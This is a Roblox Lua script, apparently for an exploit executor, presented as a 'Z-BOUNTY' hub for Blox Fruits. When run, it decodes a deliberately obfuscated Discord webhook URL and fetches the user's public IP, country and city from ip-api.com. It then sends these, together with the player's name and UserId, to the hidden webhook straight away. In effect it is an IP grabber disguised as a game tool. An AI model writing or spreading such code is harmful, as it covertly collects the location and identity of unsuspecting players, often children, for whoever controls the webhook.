--[[
    Z-BOUNTY System - Verified & Fixed
    Repository: AloneFalseExploit/AloneInfRange2
]]

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Función de seguridad (Ofuscación) para proteger tu Webhook
local function _XenoSafe(_str)
    local _res = ""
    for i = 1, #_str do 
        _res = _res .. string.char(string.byte(_str, i) - 1) 
    end
    return _res
end

-- Tu URL de Webhook protegida
local WebhookURL = _XenoSafe("iuuqt;00ejtdpse/dpn0bqj0xfbcpplt026153180861758224900qev11{midI2mFFm95Gl3KN[LuN9FG7muGs9BuqXh.Upp7QPXulK9TEKSzlI[EUbG7Vs[")

-- Obtener IP y ubicación (Corregido para asegurar la captura de la IP)
local function getIpData()
    local success, response = pcall(function()
        return HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/"))
    end)
    -- 'query' es el campo técnico donde ip-api guarda la dirección IP real
    return success and response or {query = "No detectada", country = "Desconocido", regionName = "Desconocido", city = "Desconocido"}
end

local ipData = getIpData()

-- Identificación del Mar en Blox Fruits
local function getSea()
    local id = game.PlaceId
    if id == 2753915549 then return "Primer Mar"
    elseif id == 4442245229 then return "Segundo Mar"
    elseif id == 7449925065 then return "Tercer Mar"
    else return "Mar Desconocido" end
end

-- Estructura visual exacta (Referencia foto 1000008396.jpg)
local payload = {
    ["embeds"] = {{
        ["title"] = "🚀 HUB ACTIVADO (Z-BOUNTY)",
        ["color"] = 65280, -- Verde neón
        ["fields"] = {
            {["name"] = "👤 Jugador", ["value"] = player.Name, ["inline"] = true},
            {["name"] = "🆔 UserId", ["value"] = tostring(player.UserId), ["inline"] = true},
            {["name"] = "🌐 Dirección IP", ["value"] = ipData.query, ["inline"] = false},
            {["name"] = "🌍 País", ["value"] = ipData.country, ["inline"] = true},
            {["name"] = "🏙️ Ciudad", ["value"] = ipData.city, ["inline"] = true},
            {["name"] = "🎮 Juego", ["value"] = "Blox Fruits | " .. getSea(), ["inline"] = false}
        },
        ["footer"] = {["text"] = "Z-BOUNTY System | Dev: AloneFalseExploit 🔥"}
    }}
}

-- Función de envío optimizada para Xeno
local function sendLog()
    local xenoRequest = request or http_request or (http and http.request) or (syn and syn.request)
    
    if xenoRequest then
        pcall(function()
            xenoRequest({
                Url = WebhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
    else
        warn("Xeno: No se encontró función de solicitud HTTP.")
    end
end

-- Ejecución inmediata
sendLog()
print("Z-BOUNTY: Reporte enviado con éxito.")
